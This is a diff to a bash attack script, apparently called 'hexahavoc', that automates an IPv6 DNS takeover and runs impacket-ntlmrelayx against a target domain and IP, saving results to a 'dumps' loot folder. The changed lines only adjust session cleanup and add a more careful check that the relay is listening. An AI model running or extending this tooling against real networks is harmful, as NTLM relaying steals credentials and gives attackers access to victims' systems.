@@ -25,6 +25,12 @@ silent=0
 loot_dir="dumps"
 session_name=""
 
+cleanup() {
+  echo -e "${YELLOW}Cleaning up session...${RESET}"
+  tmux has-session -t "$session_name" 2>/dev/null && \
+  tmux kill-session -t "$session_name" 2>/dev/null || true
+}
+
 # Print usage information
 usage() {
   echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v] [-s]${RESET}"
@@ -131,6 +137,8 @@ safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
 session_name="ipv6_dns_takeover_${safe_domain}_$(date +%H%M%S)"
 log_file="$loot_dir/hexahavoc_$(date +%F_%H-%M-%S).log"
 
+trap cleanup INT TERM EXIT
+
 # Create loot directory if it doesn't exist
 mkdir -p "$loot_dir"
 
@@ -200,22 +208,34 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" \
   exit 1
 }
 
-sleep 3
+# give tmux + python spawn chain time to fully initialize
+sleep 4
 
-tmux capture-pane -t "$session_name:impacket-ntlmrelayx" -p | grep -qi "Listening" || {
-  echo -e "${RED}ntlmrelayx did not reach listening state${RESET}"
+started=0
+
+for i in {1..15}; do
+  # ensure real process (not shell wrapper)
+  if pgrep -fa "ntlmrelayx.*$target_ip" | grep -v "bash -lc" >/dev/null; then
+
+    # ensure socket is actually bound AND persistent
+    if ss -lntp 2>/dev/null | grep -q "ntlmrelayx"; then
+      sleep 1
+
+      # second confirmation pass (important)
+      ss -lntp 2>/dev/null | grep -q "ntlmrelayx" && {
+        started=1
+        break
+      }
+    fi
+  fi
+
+  sleep 1
+done
+
+[[ "$started" -eq 1 ]] || {
+  echo -e "${RED}ntlmrelayx failed stability check${RESET}"
   exit 1
 }
-
-cleanup() {
-  local exit_code=$?
-  if [[ $exit_code -ne 0 ]]; then
-    echo -e "${YELLOW}Cleaning up session...${RESET}"
-    tmux has-session -t "$session_name" 2>/dev/null && \
-    tmux kill-session -t "$session_name"
-  fi
-}
-trap cleanup EXIT INT TERM
 
 # Disable verbose logging
 if [ "$verbose" -eq 1 ]; then
